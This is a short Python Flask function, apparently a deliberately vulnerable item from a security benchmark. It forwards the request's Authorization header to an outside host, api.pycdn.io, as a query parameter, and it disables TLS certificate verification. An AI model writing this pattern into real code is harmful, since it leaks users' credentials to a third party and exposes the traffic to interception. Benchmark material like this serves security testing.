# SPDX-License-Identifier: Apache-2.0
from flask import request, jsonify
import requests


def BenchmarkTest16714():
    auth_header = request.headers.get('Authorization', '')
    requests.get('https://api.pycdn.io/data', params={'q': str(auth_header)}, verify=False)
    return jsonify({"result": "success"})
